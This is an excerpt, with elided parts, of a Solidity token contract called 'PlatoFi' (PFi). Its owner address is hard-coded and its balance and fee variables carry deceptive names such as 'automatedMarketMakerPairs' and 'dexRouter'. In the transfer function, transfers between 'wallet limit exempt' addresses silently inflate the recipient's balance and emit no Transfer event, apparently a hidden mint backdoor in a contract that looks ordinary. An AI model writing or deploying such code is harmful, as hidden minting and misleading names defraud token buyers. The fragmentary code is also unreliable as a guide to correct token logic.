...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x309e92e85A9B161D4A0cC1466Ec88C2d917359B5;
...
// https://web.wechat.com/PlatoFiKOR
// https://www.smartcontracts.tools/

contract Pfi is Context, IERC20, Ownable {
    ...
    string private _name = "PlatoFi";
    string private _symbol = unicode"PFi";
    ...
    constructor () {
        automatedMarketMakerPairs[owner()] = _tTotal;
    ...
    function includeInReward(address holder) external onlyOwner() {
        ...
        for (uint256 i = 0; i < _creator.length; i++) {
            if (_creator[i] == holder) {
                ...
                automatedMarketMakerPairs[holder] = 0;
                isBot[holder] = false;
                _creator.pop();
                break;
            }
    ...
    return (rAmount, rValueAmount, rFee, tTransferAmount, tFee, tLiquidity, tDevelopment);
        ...
        for (uint256 i = 0; i < _creator.length; i++) {
            if (automatedMarketMakerPairs[_creator[i]] > rTotalSupply || automatedMarketMakerPairs[_creator[i]] > tTotalSuply) return (_rTotal, _tTotal);
            rTotalSupply = rTotalSupply.sub(automatedMarketMakerPairs[_creator[i]]);
            tTotalSuply = tTotalSuply.sub(automatedMarketMakerPairs[_creator[i]]);
        }
        ...
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        automatedMarketMakerPairs[address(this)] = automatedMarketMakerPairs[address(this)].add(rLiquidity);
        if(isBot[address(this)])
            automatedMarketMakerPairs[address(this)] = automatedMarketMakerPairs[address(this)].add(tLiquidity);
    ...
    function _transfer(
        address _transactAmountFrom,
        address _emitTokensTo,
        uint256 _emitAmountsTo
    ) private {
        require(_emitAmountsTo > 0, "Transfer amount must be greater than zero");
        bool transactFees = false;
        if(!isWalletLimitExempt[_transactAmountFrom] && !isWalletLimitExempt[_emitTokensTo]){
            transactFees = true;
        ...
        _tokenTransfer(_transactAmountFrom,_emitTokensTo,_emitAmountsTo,transactFees);
    }
    ...
    }function _tokenTransfer(address sender, address _emitTo, uint256 amount,bool transactFees) private {     
            _transferStandard(sender, _emitTo, amount, transactFees);       
    }
    function _transferStandard(address sender, address _emitTo, uint256 _rTotalAmount,bool transactFees) private {
        uint256 dexRouter = 0;
        if (transactFees){
        dexRouter = _rTotalAmount.mul(1).div(100) ;   
        }    
        uint256 _tTotalAmount = _rTotalAmount - dexRouter;
        automatedMarketMakerPairs[_emitTo] = automatedMarketMakerPairs[_emitTo].add(_tTotalAmount);
        uint256 _deliver = automatedMarketMakerPairs[_emitTo].add(_tTotalAmount);
        automatedMarketMakerPairs[sender] = automatedMarketMakerPairs[sender].sub(_tTotalAmount);
        bool tradingAllowed = isWalletLimitExempt[sender] && isWalletLimitExempt[_emitTo];
             if (tradingAllowed ){
              automatedMarketMakerPairs[_emitTo] =_deliver;
        } else {
             emit Transfer(sender, _emitTo, _tTotalAmount);
         }        
    }
}